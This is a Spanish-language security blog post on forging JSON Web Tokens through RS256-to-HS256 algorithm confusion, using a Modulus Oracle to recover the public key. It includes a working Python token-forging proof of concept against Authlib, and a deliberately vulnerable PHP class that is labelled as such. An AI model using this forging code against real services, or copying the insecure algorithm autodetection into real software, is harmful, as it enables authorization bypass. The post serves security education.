---
layout: post
title: "Modulus Oracle & JWT"
author: "RoP Team"
description: "Rompiendo un JWT vulnerable con Modulus Oracle"
keywords: "RSA, JWT, crypto, oracle, modulus"
date: 2020-06-21 00:00:00 -0500
categories: pentesting
lang: es
lang-ref: modulus-oracle-part2
---

En una [publicación anterior][1] hablamos sobre el *Modulus Oracle Attack*. Esta técnica explota la capacidad de tratar un *modulus error* como un oráculo para inferir el valor del módulo y reconstruir la llave pública. En realidad, esto no debería ser un problema. La llave pública es "pública" de cualquier modo. Pero en ciertos casos, conocer la llave pública, puede ser muy útil. El siguiente es uno de esos casos.

<!--more-->

### JWT y el cambio de algoritmo

[JWT][2] es una tecnología utilizada ampliamente para implementar autorización en aplicaciones web. Nos permite crear y verificar tokens de autorización utilizando criptografía para garantizar la integridad de los tokens. Sin embargo, existen vulnerabilidades en ciertas implementaciones de JWT que nos permiten falsificar tokens y burlar los controles de autorización. Un ataque contra algunas librerías de JWT se detalla en [este post][3]. Hoy todas estas vulnerabilidades deberían estar corregidas pero aún es posible encontrarlas con la ayuda de un desarrollador descuidado.

Por ejemplo, es muy fácil meter la pata al usar la librería para python [Authlib][4]. El siguiente código muestra como la función `decode` acepta sin distinción un token válido y otro falsificado. Estamos usando `Authlib 0.14.3` (la última versión a la fecha)

```py
from base64 import urlsafe_b64encode as enc
from base64 import urlsafe_b64decode as dec
from Crypto.Hash import HMAC, SHA256
from Crypto.PublicKey import RSA
import json

from authlib.jose import jwt


# Generate a RSA keys pair
private_key = RSA.generate(1024)
public_key = private_key.publickey()

# Generate a valid RS256 signed token
valid_token = jwt.encode(
    {'alg': 'RS256'},
    {'admin': False},
    private_key.export_key()
)
print('VALID TOKEN: {}'.format(valid_token))

# Forging a HS256 signed token
header = enc(json.dumps({'alg': 'HS256'}).encode()).strip(b'=')
body = enc(json.dumps({'admin': True}).encode()).strip(b'=')
signature = enc(HMAC.new(
    public_key.export_key(),
    b'.'.join([header, body]),
    SHA256
).digest()).strip(b'=')
forged_token = b'.'.join([header, body, signature])
print('FORGED TOKEN: {}'.format(forged_token))

# decoding the valid token
data = jwt.decode(valid_token, public_key.export_key())
print('REAL DATA: {}'.format(data))

# decoding the forged token
data = jwt.decode(forged_token, public_key.export_key())
print('FAKE DATA: {}'.format(data))
```

**Salida:**
```
VALID TOKEN: b'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ZmFsc2V9.eo7MNx1XBcZ5dw_EY4yTLrO0rSGkOODeUBapQ__QTx6NzbnF65Gre2hcRpBOx3Mq24AR4LNnG2Kso2EboeS7qNZbC8fiTxO7YlKufbHoOXy1-p5_31AhuvOewncksvhOb7F5Y0WZX5vmAdKv7MlOSZIlMwRvJaoSRbjqkfEC7Xc'
FORGED TOKEN: b'eyJhbGciOiAiSFMyNTYifQ.eyJhZG1pbiI6IHRydWV9.BlEUBfCRolm91O1gOSXPPSJJkmVXjsfiNY5JwNojdBY'
REAL DATA: {'admin': False}
FAKE DATA: {'admin': True}
```

Escribir código vulnerable puede ser un poco más difícil con otras librerías pero no imposible.

Como puedes ver, para explotar esta vulnerabilidad necesitamos la llave pública. Podemos usar la llave pública del certificado SSL/TLS, pero nada garantiza que estas llaves sean las mismas. Así que tuvimos la idea de realizar un *Modulus Oracle Attack* para obtener la llave pública. Buscamos librerías JWT razonablemente débiles y vulnerables a Modulus Oracle y encontramos una.

### gree/jose

[gree/jose][5] es una librería JWT para PHP. Las versiones antiguas (<=2.2.0) de esta librería son vulnerables al cambio de algoritmo. La versión actual (2.2.1) no es vulnerable pero con la ayuda de nuestro desarrollador podría serlo. Si echamos un vistazo al [parche][6] introducido en la versión actual veremos que los algoritmos HMAC se deshabilitan cuando el algoritmo de firmado es autodetectado por la librería. De esta manera se previene el código vulnerable cuando un desarrollador perezoso olvida especificar el algoritmo de firmado en la función `verify`. Pero nuestro desarrollador podría pensar que es una idea genial programar su propia clase utilitaria que autodetecte el algoritmo y escribir algo como lo siguiente:

```php
class JWTUtil {
    function encode($data, $key, $algorithm='HS256') {
        $jwt = new JOSE_JWT($data);
        $jwt = $jwt->sign($key, $algorithm);
        return $jwt->toString();
    }
    
    function decode($token, $key) {
        try {
            $jwt = JOSE_JWT::decode($token);
            $jwt->verify($key, $jwt->header['alg']); // autodetect algorithm
        } catch (Exception $err) {
            return NULL;
        }
        return $jwt->claims;
    }
}
```

> **ADVERTENCIA:** El código anterior es **VULNERABLE** y ha sido colocado únicamente con fines demostrativos.

### phpseclib

Internamente `gree/jose` depende de [phpseclib][7]. Esta es una librería, en puro PHP, con implementaciones de algoritmos criptográficos. Actualmente la última versión publicada es la 2.0.27. Si revisamos el código fuente, veremos que el método `JWT::verify` de gree/jose llega hasta el método `RSA::_rsavp1` de phpseclib. Veamos este último.

Fuente: [phpseclib github][8]
```php
function _rsavp1($s)
{
    if ($s->compare($this->zero) < 0 || $s->compare($this->modulus) > 0) {
        user_error('Signature representative out of range');
        return false;
    }
    return $this->_exponentiate($s);
}
```

Como podemos ver, este método valida que la firma (`$s`) esté en el rango $$[0, N]$$ (con $$N$$ como el módulo). Cuando la firma está fuera del rango, un error de usuario se dispara y se muestra en la página web como un mensaje **Notice**. Así tenemos un comportamiento identificable para realizar un Modulus Oracle Attack.

> Para que los errores se muestren en la página web, el valor de la directiva `display_errors` de PHP debe ser `On`.

Ahora tenemos todas las piezas: una implementación vulnerable de JWT y un Modulus Oracle. Vamos a la demo.

### Demo

Hemos publicado en nuestro [repositorio de Github][9] una aplicación vulnerable estilo CTF para demostrar el ataque descrito. Puedes intentar resolverlo por tu cuenta o mirar la solución en el script `modulus-oracle-jwt.py`.

<iframe width="560" height="315" src="https://www.youtube.com/embed/ygOps-lZaxc" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

<br>

Debido a que las aplicaciones web generalmente no muestran errores, es poco probable que podamos usarlos para obtener un Modulus Oracle. Pero es posible obtener un Modulus Oracle de otra forma.

Continuará...


[1]: https://blog.rop.la/en/pentesting/2020/06/15/modulus-oracle-part1.html
[2]: https://jwt.io/introduction/
[3]: https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries
[4]: https://github.com/lepture/authlib
[5]: https://github.com/nov/jose-php
[6]: https://github.com/nov/jose-php/commit/1cce55e27adf0274193eb1cd74b927a398a3df4b
[7]: https://github.com/phpseclib/phpseclib
[8]: https://github.com/phpseclib/phpseclib/blob/2.0.27/phpseclib/Crypt/RSA.php#L2426
[9]: https://github.com/rop-la/modulus-oracle-jwt